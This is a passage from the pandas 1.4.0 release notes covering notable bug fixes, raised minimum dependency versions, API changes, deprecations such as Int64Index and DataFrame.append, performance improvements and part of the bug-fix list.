:meth:`DataFrame.to_json` using ``orient='table'`` (:issue:`20612`, :issue:`44705`)\n- Add support for `Zstandard <http://facebook.github.io/zstd/>`_ compression to :meth:`DataFrame.to_pickle`/:meth:`read_pickle` and friends (:issue:`43925`)\n- :meth:`DataFrame.to_sql` now returns an ``int`` of the number of written rows (:issue:`23998`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_140.notable_bug_fixes.inconsistent_date_string_parsing:\n\nInconsistent date string parsing\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``dayfirst`` option of :func:`to_datetime` isn't strict, and this can lead\nto surprising behavior:\n\n.. ipython:: python\n    :okwarning:\n\n    pd.to_datetime([\"31-12-2021\"], dayfirst=False)\n\nNow, a warning will be raised if a date string cannot be parsed accordance to\nthe given ``dayfirst`` value when the value is a delimited date string (e.g.\n``31-12-2012``).\n\n.. _whatsnew_140.notable_bug_fixes.concat_with_empty_or_all_na:\n\nIgnoring dtypes in concat with empty or all-NA columns\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. note::\n    This behaviour change has been reverted in pandas 1.4.3.\n\nWhen using :func:`concat` to concatenate two or more :class:`DataFrame` objects,\nif one of the DataFrames was empty or had all-NA values, its dtype was\n*sometimes* ignored when finding the concatenated dtype.  These are now\nconsistently *not* ignored (:issue:`43507`).\n\n.. code-block:: ipython\n\n    In [3]: df1 = pd.DataFrame({\"bar\": [pd.Timestamp(\"2013-01-01\")]}, index=range(1))\n    In [4]: df2 = pd.DataFrame({\"bar\": np.nan}, index=range(1, 2))\n    In [5]: res = pd.concat([df1, df2])\n\nPreviously, the float-dtype in ``df2`` would be ignored so the result dtype\nwould be ``datetime64[ns]``. As a result, the ``np.nan`` would be cast to\n``NaT``.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [6]: res\n    Out[6]:\n             bar\n    0 2013-01-01\n    1        NaT\n\nNow the float-dtype is respected. Since the common dtype for these DataFrames is\nobject, the ``np.nan`` is retained.\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [6]: res\n    Out[6]:\n                       bar\n    0  2013-01-01 00:00:00\n    1                  NaN\n\n\n\n.. _whatsnew_140.notable_bug_fixes.value_counts_and_mode_do_not_coerce_to_nan:\n\nNull-values are no longer coerced to NaN-value in value_counts and mode\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`Series.value_counts` and :meth:`Series.mode` no longer coerce ``None``,\n``NaT`` and other null-values to a NaN-value for ``np.object_``-dtype. This\nbehavior is now consistent with ``unique``, ``isin`` and others\n(:issue:`42688`).\n\n.. ipython:: python\n\n    s = pd.Series([True, None, pd.NaT, None, pd.NaT, None])\n    res = s.value_counts(dropna=False)\n\nPreviously, all null-values were replaced by a NaN-value.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: res\n    Out[3]:\n    NaN     5\n    True    1\n    dtype: int64\n\nNow null-values are no longer mangled.\n\n*New behavior*:\n\n.. ipython:: python\n\n    res\n\n.. _whatsnew_140.notable_bug_fixes.read_csv_mangle_dup_cols:\n\nmangle_dupe_cols in read_csv no longer renames unique columns conflicting with target names\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_csv` no longer renames unique column labels which conflict with the target\nnames of duplicated columns. Already existing columns are skipped, i.e. the next\navailable index is used for the target column name (:issue:`14704`).\n\n.. ipython:: python\n\n    import io\n\n    data = \"a,a,a.1\\n1,2,3\"\n    res = pd.read_csv(io.StringIO(data))\n\nPreviously, the second column was called ``a.1``, while the third column was\nalso renamed to ``a.1.1``.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: res\n    Out[3]:\n        a  a.1  a.1.1\n    0   1    2      3\n\nNow the renaming checks if ``a.1`` already exists when changing the name of the\nsecond column and jumps this index. The second column is instead renamed to\n``a.2``.\n\n*New behavior*:\n\n.. ipython:: python\n\n    res\n\n.. _whatsnew_140.notable_bug_fixes.unstack_pivot_int32_limit:\n\nunstack and pivot_table no longer raises ValueError for result that would exceed int32 limit\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously :meth:`DataFrame.pivot_table` and :meth:`DataFrame.unstack` would\nraise a ``ValueError`` if the operation could produce a result with more than\n``2**31 - 1`` elements. This operation now raises a\n:class:`errors.PerformanceWarning` instead (:issue:`26314`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df = DataFrame({\"ind1\": np.arange(2 ** 16), \"ind2\": np.arange(2 ** 16), \"count\": 0})\n    In [4]: df.pivot_table(index=\"ind1\", columns=\"ind2\", values=\"count\", aggfunc=\"count\")\n    ValueError: Unstacked DataFrame is too big, causing int32 overflow\n\n*New behavior*:\n\n.. code-block:: python\n\n    In [4]: df.pivot_table(index=\"ind1\", columns=\"ind2\", values=\"count\", aggfunc=\"count\")\n    PerformanceWarning: The following operation may generate 4294967296 cells in the resulting pandas object.\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.notable_bug_fixes.groupby_apply_mutation:\n\ngroupby.apply consistent transform detection\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` are designed to be flexible, allowing users to perform\naggregations, transformations, filters, and use it with user-defined functions\nthat might not fall into any of these categories. As part of this, apply will\nattempt to detect when an operation is a transform, and in such a case, the\nresult will have the same index as the input. In order to determine if the\noperation is a transform, pandas compares the input's index to the result's and\ndetermines if it has been mutated. Previously in pandas 1.3, different code\npaths used different definitions of \"mutated\": some would use Python's ``is``\nwhereas others would test only up to equality.\n\nThis inconsistency has been removed, pandas now tests up to equality.\n\n.. ipython:: python\n\n    def func(x):\n        return x.copy()\n\n    df = pd.DataFrame({'a': [1, 2], 'b': [3, 4], 'c': [5, 6]})\n    df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.groupby(['a']).apply(func)\n    Out[3]:\n         a  b  c\n    a\n    1 0  1  3  5\n    2 1  2  4  6\n\n    In [4]: df.set_index(['a', 'b']).groupby(['a']).apply(func)\n    Out[4]:\n         c\n    a b\n    1 3  5\n    2 4  6\n\nIn the examples above, the first uses a code path where pandas uses ``is`` and\ndetermines that ``func`` is not a transform whereas the second tests up to\nequality and determines that ``func`` is a transform. In the first case, the\nresult's index is not the same as the input's.\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.groupby(['a']).apply(func)\n    Out[5]:\n       a  b  c\n    0  1  3  5\n    1  2  4  6\n\n    In [6]: df.set_index(['a', 'b']).groupby(['a']).apply(func)\n    Out[6]:\n         c\n    a b\n    1 3  5\n    2 4  6\n\nNow in both cases it is determined that ``func`` is a transform. In each case,\nthe result has the same index as the input.\n\n.. _whatsnew_140.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_140.api_breaking.python:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.4.0 supports Python 3.8 and higher.\n\n.. _whatsnew_140.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.18.5          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2020.1          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.8.1           |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.3.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.7.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 6.0             |          |         |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.930           |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries\n<https://pandas.pydata.org/docs/getting_started/install.html>`_ the general\nrecommendation is to use the latest version. The following table lists the\nlowest version per library that is currently being tested throughout the\ndevelopment of pandas. Optional libraries below the lowest tested version may\nstill work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.8.2           |    X    |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |         |\n+-----------------+-----------------+---------+\n| lxml            | 4.5.0           |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      | 3.3.2           |    X    |\n+-----------------+-----------------+---------+\n| numba           | 0.50.1          |    X    |\n+-----------------+-----------------+---------+\n| openpyxl        | 3.0.3           |    X    |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 0.14.0          |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 1.0.1           |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.10.1          |    X    |\n+-----------------+-----------------+---------+\n| pytables        | 3.6.1           |    X    |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| scipy           | 1.4.1           |    X    |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.4.0           |    X    |\n+-----------------+-----------------+---------+\n| tabulate        | 0.8.7           |         |\n+-----------------+-----------------+---------+\n| xarray          | 0.15.1          |    X    |\n+-----------------+-----------------+---------+\n| xlrd            | 2.0.1           |    X    |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 1.2.2           |    X    |\n+-----------------+-----------------+---------+\n| xlwt            | 1.3.0           |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_140.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- :meth:`Index.get_indexer_for` no longer accepts keyword arguments (other than ``target``); in the past these would be silently ignored if the index was not unique (:issue:`42310`)\n- Change in the position of the ``min_rows`` argument in :meth:`DataFrame.to_string` due to change in the docstring (:issue:`44304`)\n- Reduction operations for :class:`DataFrame` or :class:`Series` now raising a ``ValueError`` when ``None`` is passed for ``skipna`` (:issue:`44178`)\n- :func:`read_csv` and :func:`read_html` no longer raising an error when one of the header rows consists only of ``Unnamed:`` columns (:issue:`13054`)\n- Changed the ``name`` attribute of several holidays in\n  ``USFederalHolidayCalendar`` to match `official federal holiday\n  names <https://www.opm.gov/policy-data-oversight/pay-leave/federal-holidays/>`_\n  specifically:\n\n   - \"New Year's Day\" gains the possessive apostrophe\n   - \"Presidents Day\" becomes \"Washington's Birthday\"\n   - \"Martin Luther King Jr. Day\" is now \"Birthday of Martin Luther King, Jr.\"\n   - \"July 4th\" is now \"Independence Day\"\n   - \"Thanksgiving\" is now \"Thanksgiving Day\"\n   - \"Christmas\" is now \"Christmas Day\"\n   - Added \"Juneteenth National Independence Day\"\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n.. _whatsnew_140.deprecations.int64_uint64_float64index:\n\nDeprecated Int64Index, UInt64Index & Float64Index\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Int64Index`, :class:`UInt64Index` and :class:`Float64Index` have been\ndeprecated in favor of the base :class:`Index` class and will be removed in\nPandas 2.0 (:issue:`43028`).\n\nFor constructing a numeric index, you can use the base :class:`Index` class\ninstead specifying the data type (which will also work on older pandas\nreleases):\n\n.. code-block:: python\n\n     replace\n    pd.Int64Index([1, 2, 3])\n     with\n    pd.Index([1, 2, 3], dtype=\"int64\")\n\nFor checking the data type of an index object, you can replace ``isinstance``\nchecks with checking the ``dtype``:\n\n.. code-block:: python\n\n     replace\n    isinstance(idx, pd.Int64Index)\n     with\n    idx.dtype == \"int64\"\n\nCurrently, in order to maintain backward compatibility, calls to :class:`Index`\nwill continue to return :class:`Int64Index`, :class:`UInt64Index` and\n:class:`Float64Index` when given numeric data, but in the future, an\n:class:`Index` will be returned.\n\n*Current behavior*:\n\n.. code-block:: ipython\n\n    In [1]: pd.Index([1, 2, 3], dtype=\"int32\")\n    Out [1]: Int64Index([1, 2, 3], dtype='int64')\n    In [1]: pd.Index([1, 2, 3], dtype=\"uint64\")\n    Out [1]: UInt64Index([1, 2, 3], dtype='uint64')\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [3]: pd.Index([1, 2, 3], dtype=\"int32\")\n    Out [3]: Index([1, 2, 3], dtype='int32')\n    In [4]: pd.Index([1, 2, 3], dtype=\"uint64\")\n    Out [4]: Index([1, 2, 3], dtype='uint64')\n\n\n.. _whatsnew_140.deprecations.frame_series_append:\n\nDeprecated DataFrame.append and Series.append\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.append` and :meth:`Series.append` have been deprecated and will\nbe removed in a future version. Use :func:`pandas.concat` instead (:issue:`35407`).\n\n*Deprecated syntax*\n\n.. code-block:: ipython\n\n    In [1]: pd.Series([1, 2]).append(pd.Series([3, 4])\n    Out [1]:\n    <stdin>:1: FutureWarning: The series.append method is deprecated and will be removed from pandas in a future version. Use pandas.concat instead.\n    0    1\n    1    2\n    0    3\n    1    4\n    dtype: int64\n\n    In [2]: df1 = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB'))\n    In [3]: df2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB'))\n    In [4]: df1.append(df2)\n    Out [4]:\n    <stdin>:1: FutureWarning: The series.append method is deprecated and will be removed from pandas in a future version. Use pandas.concat instead.\n       A  B\n    0  1  2\n    1  3  4\n    0  5  6\n    1  7  8\n\n*Recommended syntax*\n\n.. ipython:: python\n\n    pd.concat([pd.Series([1, 2]), pd.Series([3, 4])])\n\n    df1 = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB'))\n    df2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB'))\n    pd.concat([df1, df2])\n\n\n.. _whatsnew_140.deprecations.other:\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Deprecated :meth:`Index.is_type_compatible` (:issue:`42113`)\n- Deprecated ``method`` argument in :meth:`Index.get_loc`, use ``index.get_indexer([label], method=...)`` instead (:issue:`42269`)\n- Deprecated treating integer keys in :meth:`Series.__setitem__` as positional when the index is a :class:`Float64Index` not containing the key, a :class:`IntervalIndex` with no entries containing the key, or a :class:`MultiIndex` with leading :class:`Float64Index` level not containing the key (:issue:`33469`)\n- Deprecated treating ``numpy.datetime64`` objects as UTC times when passed to the :class:`Timestamp` constructor along with a timezone. In a future version, these will be treated as wall-times. To retain the old behavior, use ``Timestamp(dt64).tz_localize(\"UTC\").tz_convert(tz)`` (:issue:`24559`)\n- Deprecated ignoring missing labels when indexing with a sequence of labels on a level of a :class:`MultiIndex` (:issue:`42351`)\n- Creating an empty :class:`Series` without a ``dtype`` will now raise a more visible ``FutureWarning`` instead of a ``DeprecationWarning`` (:issue:`30017`)\n- Deprecated the ``kind`` argument in :meth:`Index.get_slice_bound`, :meth:`Index.slice_indexer`, and :meth:`Index.slice_locs`; in a future version passing ``kind`` will raise (:issue:`42857`)\n- Deprecated dropping of nuisance columns in :class:`Rolling`, :class:`Expanding`, and :class:`EWM` aggregations (:issue:`42738`)\n- Deprecated :meth:`Index.reindex` with a non-unique :class:`Index` (:issue:`42568`)\n- Deprecated :meth:`.Styler.render` in favor of :meth:`.Styler.to_html` (:issue:`42140`)\n- Deprecated :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns` in favor of :meth:`.Styler.hide` (:issue:`43758`)\n- Deprecated passing in a string column label into ``times`` in :meth:`DataFrame.ewm` (:issue:`43265`)\n- Deprecated the ``include_start`` and ``include_end`` arguments in :meth:`DataFrame.between_time`; in a future version passing ``include_start`` or ``include_end`` will raise (:issue:`40245`)\n- Deprecated the ``squeeze`` argument to :meth:`read_csv`, :meth:`read_table`, and :meth:`read_excel`. Users should squeeze the :class:`DataFrame` afterwards with ``.squeeze(\"columns\")`` instead (:issue:`43242`)\n- Deprecated the ``index`` argument to :class:`SparseArray` construction (:issue:`23089`)\n- Deprecated the ``closed`` argument in :meth:`date_range` and :meth:`bdate_range` in favor of ``inclusive`` argument; In a future version passing ``closed`` will raise (:issue:`40245`)\n- Deprecated :meth:`.Rolling.validate`, :meth:`.Expanding.validate`, and :meth:`.ExponentialMovingWindow.validate` (:issue:`43665`)\n- Deprecated silent dropping of columns that raised a ``TypeError`` in :class:`Series.transform` and :class:`DataFrame.transform` when used with a dictionary (:issue:`43740`)\n- Deprecated silent dropping of columns that raised a ``TypeError``, ``DataError``, and some cases of ``ValueError`` in :meth:`Series.aggregate`, :meth:`DataFrame.aggregate`, :meth:`Series.groupby.aggregate`, and :meth:`DataFrame.groupby.aggregate` when used with a list (:issue:`43740`)\n- Deprecated casting behavior when setting timezone-aware value(s) into a timezone-aware :class:`Series` or :class:`DataFrame` column when the timezones do not match. Previously this cast to object dtype. In a future version, the values being inserted will be converted to the series or column's existing timezone (:issue:`37605`)\n- Deprecated casting behavior when passing an item with mismatched-timezone to :meth:`DatetimeIndex.insert`, :meth:`DatetimeIndex.putmask`, :meth:`DatetimeIndex.where` :meth:`DatetimeIndex.fillna`, :meth:`Series.mask`, :meth:`Series.where`, :meth:`Series.fillna`, :meth:`Series.shift`, :meth:`Series.replace`, :meth:`Series.reindex` (and :class:`DataFrame` column analogues). In the past this has cast to object ``dtype``. In a future version, these will cast the passed item to the index or series's timezone (:issue:`37605`, :issue:`44940`)\n- Deprecated the ``prefix`` keyword argument in :func:`read_csv` and :func:`read_table`, in a future version the argument will be removed (:issue:`43396`)\n- Deprecated passing non boolean argument to ``sort`` in :func:`concat` (:issue:`41518`)\n- Deprecated passing arguments as positional for :func:`read_fwf` other than ``filepath_or_buffer`` (:issue:`41485`)\n- Deprecated passing arguments as positional for :func:`read_xml` other than ``path_or_buffer`` (:issue:`45133`)\n- Deprecated passing ``skipna=None`` for :meth:`DataFrame.mad` and :meth:`Series.mad`, pass ``skipna=True`` instead (:issue:`44580`)\n- Deprecated the behavior of :func:`to_datetime` with the string \"now\" with ``utc=False``; in a future version this will match ``Timestamp(\"now\")``, which in turn matches :meth:`Timestamp.now` returning the local time (:issue:`18705`)\n- Deprecated :meth:`DateOffset.apply`, use ``offset + other`` instead (:issue:`44522`)\n- Deprecated parameter ``names`` in :meth:`Index.copy` (:issue:`44916`)\n- A deprecation warning is now shown for :meth:`DataFrame.to_latex` indicating the arguments signature may change and emulate more the arguments to :meth:`.Styler.to_latex` in future versions (:issue:`44411`)\n- Deprecated behavior of :func:`concat` between objects with bool-dtype and numeric-dtypes; in a future version these will cast to object dtype instead of coercing bools to numeric values (:issue:`39817`)\n- Deprecated :meth:`Categorical.replace`, use :meth:`Series.replace` instead (:issue:`44929`)\n- Deprecated passing ``set`` or ``dict`` as indexer for :meth:`DataFrame.loc.__setitem__`, :meth:`DataFrame.loc.__getitem__`, :meth:`Series.loc.__setitem__`, :meth:`Series.loc.__getitem__`, :meth:`DataFrame.__getitem__`, :meth:`Series.__getitem__` and :meth:`Series.__setitem__` (:issue:`42825`)\n- Deprecated :meth:`Index.__getitem__` with a bool key; use ``index.values[key]`` to get the old behavior (:issue:`44051`)\n- Deprecated downcasting column-by-column in :meth:`DataFrame.where` with integer-dtypes (:issue:`44597`)\n- Deprecated :meth:`DatetimeIndex.union_many`, use :meth:`DatetimeIndex.union` instead (:issue:`44091`)\n- Deprecated :meth:`.Groupby.pad` in favor of :meth:`.Groupby.ffill` (:issue:`33396`)\n- Deprecated :meth:`.Groupby.backfill` in favor of :meth:`.Groupby.bfill` (:issue:`33396`)\n- Deprecated :meth:`.Resample.pad` in favor of :meth:`.Resample.ffill` (:issue:`33396`)\n- Deprecated :meth:`.Resample.backfill` in favor of :meth:`.Resample.bfill` (:issue:`33396`)\n- Deprecated ``numeric_only=None`` in :meth:`DataFrame.rank`; in a future version ``numeric_only`` must be either ``True`` or ``False`` (the default) (:issue:`45036`)\n- Deprecated the behavior of :meth:`Timestamp.utcfromtimestamp`, in the future it will return a timezone-aware UTC :class:`Timestamp` (:issue:`22451`)\n- Deprecated :meth:`NaT.freq` (:issue:`45071`)\n- Deprecated behavior of :class:`Series` and :class:`DataFrame` construction when passed float-dtype data containing ``NaN`` and an integer dtype ignoring the dtype argument; in a future version this will raise (:issue:`40110`)\n- Deprecated the behaviour of :meth:`Series.to_frame` and :meth:`Index.to_frame` to ignore the ``name`` argument when ``name=None``. Currently, this means to preserve the existing name, but in the future explicitly passing ``name=None`` will set ``None`` as the name of the column in the resulting DataFrame (:issue:`44212`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`.DataFrameGroupBy.sample` and :meth:`.SeriesGroupBy.sample`, especially when ``weights`` argument provided (:issue:`34483`)\n- Performance improvement when converting non-string arrays to string arrays (:issue:`34483`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` for user-defined functions (:issue:`41598`)\n- Performance improvement in constructing :class:`DataFrame` objects (:issue:`42631`, :issue:`43142`, :issue:`43147`, :issue:`43307`, :issue:`43144`, :issue:`44826`)\n- Performance improvement in :meth:`.DataFrameGroupBy.shift` and :meth:`.SeriesGroupBy.shift` when ``fill_value`` argument is provided (:issue:`26615`)\n- Performance improvement in :meth:`DataFrame.corr` for ``method=pearson`` on data without missing values (:issue:`40956`)\n- Performance improvement in some :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` operations (:issue:`42992`, :issue:`43578`)\n- Performance improvement in :func:`read_stata` (:issue:`43059`, :issue:`43227`)\n- Performance improvement in :func:`read_sas` (:issue:`43333`)\n- Performance improvement in :meth:`to_datetime` with ``uint`` dtypes (:issue:`42606`)\n- Performance improvement in :meth:`to_datetime` with ``infer_datetime_format`` set to ``True`` (:issue:`43901`)\n- Performance improvement in :meth:`Series.sparse.to_coo` (:issue:`42880`)\n- Performance improvement in indexing with a :class:`UInt64Index` (:issue:`43862`)\n- Performance improvement in indexing with a :class:`Float64Index` (:issue:`43705`)\n- Performance improvement in indexing with a non-unique :class:`Index` (:issue:`43792`)\n- Performance improvement in indexing with a listlike indexer on a :class:`MultiIndex` (:issue:`43370`)\n- Performance improvement in indexing with a :class:`MultiIndex` indexer on another :class:`MultiIndex` (:issue:`43370`)\n- Performance improvement in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` (:issue:`43469`, :issue:`43725`)\n- Performance improvement in :meth:`.DataFrameGroupBy.count` and :meth:`.SeriesGroupBy.count` (:issue:`43730`, :issue:`43694`)\n- Performance improvement in :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.any`, :meth:`.DataFrameGroupBy.all`, and :meth:`.SeriesGroupBy.all` (:issue:`43675`, :issue:`42841`)\n- Performance improvement in :meth:`.DataFrameGroupBy.std` and :meth:`.SeriesGroupBy.std` (:issue:`43115`, :issue:`43576`)\n- Performance improvement in :meth:`.DataFrameGroupBy.cumsum` and :meth:`.SeriesGroupBy.cumsum` (:issue:`43309`)\n- :meth:`SparseArray.min` and :meth:`SparseArray.max` no longer require converting to a dense array (:issue:`43526`)\n- Indexing into a :class:`SparseArray` with a ``slice`` with ``step=1`` no longer requires converting to a dense array (:issue:`43777`)\n- Performance improvement in :meth:`SparseArray.take` with ``allow_fill=False`` (:issue:`43654`)\n- Performance improvement in :meth:`.Rolling.mean`, :meth:`.Expanding.mean`, :meth:`.Rolling.sum`, :meth:`.Expanding.sum`, :meth:`.Rolling.max`, :meth:`.Expanding.max`, :meth:`.Rolling.min` and :meth:`.Expanding.min` with ``engine=\"numba\"`` (:issue:`43612`, :issue:`44176`, :issue:`45170`)\n- Improved performance of :meth:`pandas.read_csv` with ``memory_map=True`` when file encoding is UTF-8 (:issue:`43787`)\n- Performance improvement in :meth:`RangeIndex.sort_values` overriding :meth:`Index.sort_values` (:issue:`43666`)\n- Performance improvement in :meth:`RangeIndex.insert` (:issue:`43988`)\n- Performance improvement in :meth:`Index.insert` (:issue:`43953`)\n- Performance improvement in :meth:`DatetimeIndex.tolist` (:issue:`43823`)\n- Performance improvement in :meth:`DatetimeIndex.union` (:issue:`42353`)\n- Performance improvement in :meth:`Series.nsmallest` (:issue:`43696`)\n- Performance improvement in :meth:`DataFrame.insert` (:issue:`42998`)\n- Performance improvement in :meth:`DataFrame.dropna` (:issue:`43683`)\n- Performance improvement in :meth:`DataFrame.fillna` (:issue:`43316`)\n- Performance improvement in :meth:`DataFrame.values` (:issue:`43160`)\n- Performance improvement in :meth:`DataFrame.select_dtypes` (:issue:`42611`)\n- Performance improvement in :class:`DataFrame` reductions (:issue:`43185`, :issue:`43243`, :issue:`43311`, :issue:`43609`)\n- Performance improvement in :meth:`Series.unstack` and :meth:`DataFrame.unstack` (:issue:`43335`, :issue:`43352`, :issue:`42704`, :issue:`43025`)\n- Performance improvement in :meth:`Series.to_frame` (:issue:`43558`)\n- Performance improvement in :meth:`Series.mad` (:issue:`43010`)\n- Performance improvement in :func:`merge` (:issue:`43332`)\n- Performance improvement in :func:`to_csv` when index column is a datetime and is formatted (:issue:`39413`)\n- Performance improvement in :func:`to_csv` when :class:`MultiIndex` contains a lot of unused levels (:issue:`37484`)\n- Performance improvement in :func:`read_csv` when ``index_col`` was set with a numeric column (:issue:`44158`)\n- Performance improvement in :func:`concat` (:issue:`43354`)\n- Performance improvement in :meth:`SparseArray.__getitem__` (:issue:`23122`)\n- Performance improvement in constructing a :class:`DataFrame` from array-like objects like a ``Pytorch`` tensor (:issue:`44616`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in setting dtype-incompatible values into a :class:`Categorical` (or ``Series`` or ``DataFrame`` backed by ``Categorical``) raising ``ValueError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.searchsorted` when passing a dtype-incompatible value raising ``KeyError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.astype` casting datetimes and :class:`Timestamp` to int for dtype ``object`` (:issue:`44930`)\n- Bug in :meth:`Series.where` with ``CategoricalDtype`` when passing a dtype-incompatible value raising ``ValueError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.fillna` when passing a dtype-incompatible value raising ``ValueError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.fillna` with a tuple-like category raising ``ValueError`` instead of ``TypeError`` when filling with a non-category tuple (:issue:`41919`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :class:`DataFrame` constructor unnecessarily copying non-datetimelike 2D object arrays (:issue:`39272`)\n- Bug in :func:`to_datetime` with ``format`` and ``pandas.NA`` was raising ``ValueError`` (:issue:`42957`)\n- :func:`to_datetime` would silently swap ``MM/DD/YYYY`` and ``DD/MM/YYYY`` formats if the given ``dayfirst`` option could not be respected - now, a warning is raised in the case of delimited date strings (e.g. ``31-12-2012``) (:issue:`12585`)\n- Bug in :meth:`date_range` and :meth:`bdate_range` do not return right bound when ``start`` = ``end`` and set is closed on one side (:issue:`43394`)\n- Bug in inplace addition and subtraction of :class:`DatetimeIndex` or :class:`TimedeltaIndex` with :class:`DatetimeArray` or :class:`TimedeltaArray` (:issue:`43904`)\n- Bug in calling ``np.isnan``, ``np.isfinite``, or ``np.isinf`` on a timezone-aware :class:`DatetimeIndex` incorrectly raising ``TypeError`` (:issue:`43917`)\n- Bug in constructing a :class:`Series` from datetime-like strings with mixed timezones incorrectly partially-inferring datetime values (:issue:`40111`)\n- Bug in addition of a :class:`Tick` object and a ``np.timedelta64`` object incorrectly raising instead of returning :class:`Timedelta` (:issue:`44474`)\n- ``np.maximum.reduce`` and ``np.minimum.reduce`` now correctly return :class:`Timestamp` and :class:`Timedelta` objects when operating on :class:`Series`, :class:`DataFrame`, or :class:`Index` with ``datetime64[ns]`` or ``timedelta64[ns]`` dtype (:issue:`43923`)\n- Bug in adding a ``np.timedelta64`` object to a :class:`BusinessDay` or :class:`CustomBusinessDay` object incorrectly raising (:issue:`44532`)\n- Bug in :meth:`Index.insert` for inserting ``np.datetime64``, ``np.timedelta64`` or ``tuple`` into :class:`Index` with ``dtype='object'`` with negative loc adding ``None`` and replacing existing value (:issue:`44509`)\n- Bug in :meth:`Timestamp.to_pydatetime` failing to retain the ``fold`` attribute (:issue:`45087`)\n- Bug in :meth:`Series.mode` with ``DatetimeTZDtype`` incorrectly returning timezone-naive and ``PeriodDtype`` incorrectly raising (:issue:`41927`)\n- Fixed regression in :meth:`~Series.reindex` raising an error when using an incompatible fill value with a datetime-like dtype (or not raising a deprecation warning for using a ``datetime.date`` 